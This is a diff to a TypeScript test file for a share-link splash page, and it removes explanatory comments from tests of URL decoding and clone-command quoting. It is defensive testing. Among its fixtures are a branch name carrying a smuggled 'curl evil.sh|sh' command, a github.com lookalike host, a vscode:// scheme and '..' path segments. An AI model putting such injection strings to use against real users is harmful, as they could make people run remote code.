@@ -16,30 +16,10 @@ import {
 } from './share-splash.ts';
 import { SITE_NAME } from './site.ts';
 
-/**
- * Encode a shared GitHub URL (a blob URL for a doc, a tree URL for a folder)
- * via the CANONICAL production encoder (`@inkeep/open-knowledge-core`
- * `encodeShareUrl`). The splash duplicates the decoder locally to avoid
- * pulling the CRDT dep tree into the static marketing build — producer/consumer
- * parity is what we want to guarantee, so the happy-path tests MUST drive the
- * same encoder a real sender uses. If the encoder bumps to v2, these tests fail
- * loud against the splash decoder staying on v1, which is exactly the
- * regression we want to catch.
- *
- * `encodeShareUrl` returns just the base64url payload — what the splash
- * route receives as the `[encoded]` path segment.
- */
 function encodeV1(sharedUrl: string): string {
   return encodeShareUrl(sharedUrl);
 }
 
-/**
- * The content-relative basename the splash renders for a v2 fixture: the last
- * segment of the doc/folder path, or the repo name when a folder share targets
- * the content root (empty path). Derived independently from the fixture's own
- * `target`/`sharedUrl` so a byte-order swap or off-by-one in the v2 depth decode
- * — a distinct code path from the v1 URL parse — surfaces as a filename mismatch.
- */
 function expectedContentFilename(entry: (typeof fixture.validShares)[number]): string {
   const target: { docPath?: string; folderPath?: string } = entry.target;
   const contentPath = target.docPath ?? target.folderPath ?? '';
@@ -294,11 +274,6 @@ describe('buildSplashViewModel', () => {
   });
 
   test('renders an unknown host (incl. a github.com lookalike) as an enterprise share', () => {
-    // GHES hostnames are arbitrary — the splash cannot tell a lookalike from a
-    // real enterprise host by structure. It renders it as an enterprise share
-    // with `isEnterpriseHost: true` so the page shows the host prominently
-    // (the recipient sees which server before acting); the receive-side trust
-    // gate is what actually prevents an untrusted host from being cloned.
     const view = buildSplashViewModel(
       encodeV1('https://github.com.evil.example/owner/repo/blob/main/README.md'),
     );
@@ -317,10 +292,6 @@ describe('buildSplashViewModel', () => {
     expect(view).toEqual({ kind: 'invalid' });
   });
 
-  // Drift guard: the splash keeps a copy-local `KNOWN_NON_GITHUB_GIT_HOSTS`
-  // (the docs build can't import the package graph). Iterate the CANONICAL set
-  // so a forge added to core but not the splash copy fails here rather than
-  // silently rendering as an enterprise share.
   for (const forge of KNOWN_NON_GITHUB_GIT_HOSTS) {
     test(`returns \`invalid\` for canonical forge host ${forge}`, () => {
       const view = buildSplashViewModel(
@@ -331,8 +302,6 @@ describe('buildSplashViewModel', () => {
   }
 
   test('returns `invalid` for a non-https scheme with an otherwise-valid shape', () => {
-    // A crafted deep link can carry any scheme with a valid host + path. The
-    // parser must reject non-https so the URL never reaches an <a href>.
     const view = buildSplashViewModel(
       encodeV1('vscode://ghes.internal.example/owner/repo/blob/main/README.md'),
     );
@@ -361,12 +330,6 @@ describe('buildSplashViewModel', () => {
 });
 
 describe('buildSplashViewModel — shell-injection guard', () => {
-  // The decoded owner/repo/branch flow into a copyable `ok clone …` command.
-  // Two layers guard it: the decode boundary rejects structurally-invalid refs
-  // (whitespace, control chars, `:`, leading `-`, non-GitHub owner/repo), and
-  // `buildCloneCommand` POSIX-single-quotes anything else, so a shell-unsafe but
-  // valid git ref (e.g. `feat;x`) is inert in the rendered command rather than
-  // over-rejected. A crafted URL thus either decodes to `invalid` or renders quoted.
   test('rejects a branch carrying a shell command separator', () => {
     const url = 'https://github.com/inkeep/playbooks/blob/main%3Bcurl%20evil.sh%7Csh/readme.md';
     expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
@@ -418,14 +381,11 @@ describe('buildSplashViewModel — shell-injection guard', () => {
     expect(view.kind).toBe('ok');
     if (view.kind === 'ok') {
       expect(view.branch).toBe('release+candidate');
-      // `+` is shell-safe, so the command renders it unquoted.
       expect(buildCloneCommand(view)).toBe('ok clone inkeep/playbooks -b release+candidate');
     }
   });
 
   test('accepts a shell-unsafe but valid ref and quotes it at render', () => {
-    // `feat;x` is a valid git ref (no whitespace / `:` / control) but shell-unsafe;
-    // the decode boundary accepts it and buildCloneCommand single-quotes it.
     const url = 'https://github.com/inkeep/playbooks/blob/feat%3Bx/readme.md';
     const view = buildSplashViewModel(encodeV1(url));
     expect(view.kind).toBe('ok');
@@ -441,8 +401,6 @@ describe('buildSplashViewModel — shell-injection guard', () => {
   });
 
   test('rejects `..` owner/repo segments (encoded) — no `ok clone ../..` rendering', () => {
-    // Percent-encoded so the URL parser does not normalize the `..` away; the
-    // segments decode to `..`, which real GitHub names never are.
     const url = 'https://github.com/%2E%2E/%2E%2E/blob/main/readme.md';
     expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
   });
@@ -518,8 +476,6 @@ describe('buildCloneCommand', () => {
   });
 
   test('POSIX-single-quotes a branch containing a literal single quote', () => {
-    // The copy-local shellSingleQuoteShareArg must escape the one byte single
-    // quotes can't carry: close, escaped literal quote, reopen ('…'\''…').
     expect(buildCloneCommand({ owner: 'o', repo: 'r', branch: "feat'x" })).toBe(
       "ok clone o/r -b 'feat'\\''x'",
     );
@@ -644,8 +600,6 @@ describe('clipboardCopyOutcome', () => {
 });
 
 describe('buildShareDescription', () => {
-  // Drive the production encoder so the view passed to buildShareDescription is
-  // exactly what the route would hand it.
   function okView(sharedUrl: string) {
     const view = buildSplashViewModel(encodeV1(sharedUrl));
     if (view.kind !== 'ok') throw new Error(`expected ok view, got ${view.kind}`);
